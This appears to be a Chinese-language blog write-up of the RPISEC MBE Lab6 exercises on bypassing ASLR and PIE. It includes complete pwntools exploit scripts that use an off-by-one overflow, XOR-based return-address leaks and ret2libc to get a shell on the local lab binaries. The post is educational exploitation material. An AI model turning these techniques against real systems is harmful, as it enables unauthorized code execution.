---
layout: post
title: "MBE Lab6 ASLR and PIE Write Up"
---

# 0x00 背景

此篇write up对应于MBE的[Lab6](https://github.com/RPISEC/MBE/tree/master/src/lab06)，针对的是ASLR和PIE的bypass，相关环境为64位的ubuntu 14.04配合使用pwntools，在gcc编译过程添加-m32选项编译为32位程序。

<!-- more -->

# 0x01

## Lab6C

此题目默认开启ASLR和PIE，但是很容易看出有Off By One漏洞可导致溢出（无栈保护）：

```c
struct savestate {
    char tweet[140];
    char username[40];
    int msglen;
} save;
…
    fgets(readbuf, 128, stdin);
    for(i = 0; i <= 40 && readbuf[i]; i++)
        save->username[i] = readbuf[i];
…
```

一个字节正好控制msglen，在set_tweet函数中则根据msglen进行strncpy导致栈溢出。但是开启PIE，只知道12bit的相对位置：

![][1]

还好此题比较简单提供了一个secret_backdoor，其中会接收cmd传递给system函数。结合栈溢出的Partial address overwrite和4bit的Bruteforce即可，代码如下：

```python
from pwn import *

for i in xrange(10):
    p = process('./lab6C')
    #context.log_level = 'debug'
    p.recvline_contains('username')
    #p.recvuntil('>')
    username = 'A'*40 + '\xc6'
    p.sendline(username)
    p.recvline_contains('Unix-Dude')
    #p.recvuntil(' ')
    tweet = 'A'*196 + '\x2b\x57'
    p.sendline(tweet)
    p.recvline_contains('sent!')
    #gdb.attach(p)
    p.sendline('/bin/ls')
    try:
        print p.recvline()
        break
    except EOFError as e:
        pass
```

利用效果如图：

![][2]

## Lab6B

此题大眼一看貌似没问题，和上一题类似也提供了个login函数会执行system shell，所以有可能配合一个地址写的漏洞跳转至该函数。除了几个功能函数，最可疑和别扭的就是hash_pass函数：

```c
void hash_pass(char * password, char * username)
{
    int i = 0;

    /* hash pass with chars of username */
    while(password[i] && username[i])
    {
        password[i] ^= username[i];
        i++;
    }

    /* hash rest of password with a pad char */
    while(password[i])
    {
        password[i] ^= 0x44;
        i++;
    }

    return;
}
…
int login_prompt(int pwsize, char * secretpw)
{
    char password[32];
    char username[32];

…
        printf("Authentication failed for user %s\n", username);
```

按照输入的username和password大小来分三种情况对比貌似没问题，但如果两者的长度都是32位，那么username就指向原来password的位置，password指向向下的栈空间，在没有遇到null字符前则会破坏保存的返回地址，下图可证（0x15为之前函数调用过程中的压栈参数）：

![][3]

现在靠着xor一直写到了ret_addr+1的位置，结合最后对username %s的输出，则可以一直输出至ret_addr+1，根据前面的xor操作轻松逆推处返回函数的地址。因为PIE后函数代码的相对位移是不变的，即可泄露计算出login的地址。

最终我们泄露出了函数地址，并且对返回地址可xor，因为username，pssword和原始的返回地址都是我们可知可控的，通过xor操作即可任意写返回地址。利用代码如下：

```python
#!/usr/bin/env python

from pwn import *

# context.log_level = 'debug'
p = process('./lab6B')
p.recvuntil('username: ')
first_username = 'A'*32
p.sendline(first_username)
p.recvuntil('password: ')
first_password = 'B'*32
p.sendline(first_password)

first_stack = p.recvn(0x5f) #add 1 bug
first_rest = p.recvn(0x19)
first_ret = first_rest[-5:-1]
origin_ret = ''
for i in xrange(4):
    origin_ret += chr(ord(first_ret[i]) ^ (ord('A')^ord('B')))
# little to login
login_addr = '\xf4'+(origin_ret[1].encode('hex')[0]+'a').decode('hex')+origin_ret[2:]

# attemps++
first_rest = first_rest[:4]+chr(ord(first_rest[4])+1)+first_rest[5:]
fake_rest = '\xff'*0x14 + login_addr + '\x14' 
# username ^ password ^ first_rest = fake_rest
second_username = first_username
second_password = ''
for i in xrange(len(fake_rest)):
    second_password += chr(ord(fake_rest[i])^ord(first_rest[i])^ord(second_username[i]))
second_password += 'B'*0x7

p.recvuntil('username: ')
p.sendline(second_username)
p.recvuntil('password: ')
p.sendline(second_password)

p.recvuntil('username: ')
p.sendline('A')
p.recvuntil('password: ')
p.sendline('B')

p.interactive()
```

因为我们覆盖的是main函数中的返回地址，所以需要循环三次正常退出，这里的小细节就是循环过程中栈上的计数器会加一，我们在xor栈上数据的时候也要考虑这一点，才能成功退出返回至login函数，利用如图：

![][4]

## Lab6A

此题中的小问题很多，还是个商品用户系统：uinfo结构体中居然还保存函数指针；setup_account函数中明显会导致溢出uinfo结构体，进而影响函数指针；make_note函数存在明显的栈溢出，此题的目的应该是联合这小问题进行exploit。（源代码有些长就不引用了）利用思路如下：

1. 首先使用setup_account函数溢出函数指针为print_name，因为和原始的函数指针print_listing距离有些远，所以需要和Lab6C一样稍微爆破一下。
2. 同样的print_name由于%s的使用，即可泄露出uinfo结构体，包括函数指针地址，也就泄露了整个代码段和数据段的地址。
3. 结合源码的write_wrap函数可以写出read函数的地址，因为choice 3在调用函数指针的过程中会传递结构体指针参数，进而损坏write_wrap函数需要的参数，所以不能简单地覆盖函数指针调用write_wrap。
4. 那就只好借助make_note函数的栈溢出漏洞，布局参数来调用write_wrap函数，输出read函数的地址。有了read函数的地址，我们就可以推出内存中libc中system函数和/bin/sh字符串的地址。
5. 最后覆盖函数指针调用make_note函数，利用栈溢出布局调用system函数执行/bin/sh。

利用代码如下：

```python
from pwn import *

context.log_level = 'debug'

for i in xrange(32):
    p = process('./lab6A')
    p.sendlineafter('Choice: ', '1')
    p.sendafter('name: ', 'A'*32)
    p.sendafter('description: ', 'B'*90+'\xe2\x5b')
    
    p.sendlineafter('Choice: ', '3')
    try:
        print_name = p.recv(len('Username: ')+32+128+4)[-4:]
        break
    except EOFError as e:
        pass

print_name_offset = 0xbe2
print_name_addr = u32(print_name)

make_note_offset = 0x9af
make_note_addr = print_name_addr-(print_name_offset-make_note_offset)
make_note = p32(make_note_addr)

write_wrap_offset = 0x97a
write_wrap_addr = print_name_addr-(print_name_offset-write_wrap_offset)
write_wrap = p32(write_wrap_addr)

main_while_offset = 0xc0f
main_while_addr = print_name_addr-(print_name_offset-main_while_offset)
main_while = p32(main_while_addr)

read_got_offset = 0x300c
read_got_addr = print_name_addr-(print_name_offset-read_got_offset)
read_got = p32(read_got_addr)

ulisting_offset = 0x3140
ulisting_addr = print_name_addr-(print_name_offset-ulisting_offset)
ulisting = p32(ulisting_addr)

p.sendlineafter('Choice: ', '2')
p.sendlineafter('name: ', read_got)
p.sendlineafter('price: ', 'larryxi')

p.sendlineafter('Choice: ', '1')
p.sendafter('name: ', 'A'*31+'\x00')
p.sendafter('description: ', 'C'*91+make_note)

p.sendlineafter('Choice: ', '3')
payload_partone = 'A'*0x34+write_wrap+main_while+ulisting
p.sendlineafter('listing...: ', payload_partone)
read_func = p.recv(8)[:4]
#gdb.attach(p)

read_func_addr = u32(read_func)
libc = ELF('libc.so')
system_func_addr = read_func_addr - (libc.symbols['read'] - libc.symbols['system'])
string_sh_addr = read_func_addr - (libc.symbols['read'] - next(libc.search('/bin/sh')))
system_func = p32(system_func_addr)
string_sh = p32(string_sh_addr)

p.sendlineafter('Choice: ', '1')
p.sendafter('name: ', 'A'*31+'\x00')
p.sendafter('description: ', 'D'*91+make_note)

p.sendlineafter('Choice: ', '3')
payload_parttwo = 'A'*0x34+system_func+main_while+string_sh
#print repr(system_func+main_while+string_sh)
#gdb.attach(p)
p.sendlineafter('listing...: ', payload_parttwo)
p.interactive()
```

是不是很简单？并不是，还有几个小细节需要注意：

1. 源代码中有些部分是使用read函数接收输入，而且关闭了buffer的缓冲，所以在pwntools中需要使用send之类的函数而不是sendline，新的换行会让read接收不到我们的期望数据。
2. setup_account中使用了strncpy拼接字符串导致溢出，但strncpy是从原始字符串的末尾拼接，所以在传递username过程中需要以null结尾才能重置整个uinfo结构体，而不是附加至原始值的末尾。
3. write_wrap函数接收的参数是指针的指针，但是我们的read@got.plt只是个一级指针，也不好直接找到对应的指针的指针，而源码中还有个make_listing函数会向全局结构体item写入数据，因此其是可知可控的，向其中写入read_got_addr就构成了一个指针的指针。
4. 因为第三点，在我们原来的思路中就需要加入写item数据这一步。

最终的利用效果如下图：

![][5]

# 0x02 总结

在漏洞利用的过程中，虽然思路会很完美，但在落实到利用代码中会遇到各种没有考虑到的问题，这是还是需要结合调试定位解决问题。虽然整体可以做到位置无关，但是内部还是相对位置相关的，泛化到我们每个人亦是如此。

[1]: https://wx4.sinaimg.cn/large/ee2fecafly1fphgg3z7b8j20k503774o.jpg
[2]: https://wx1.sinaimg.cn/large/ee2fecafly1fphgg5021ej20it03mmxo.jpg
[3]: https://wx3.sinaimg.cn/large/ee2fecafly1fphgg5u6vwj20ja03k0sy.jpg
[4]: https://wx2.sinaimg.cn/large/ee2fecafly1fphgg6sr8vj20vf06njs7.jpg
[5]: https://wx3.sinaimg.cn/large/ee2fecafly1fphgg8rdztj20mt0bita8.jpg
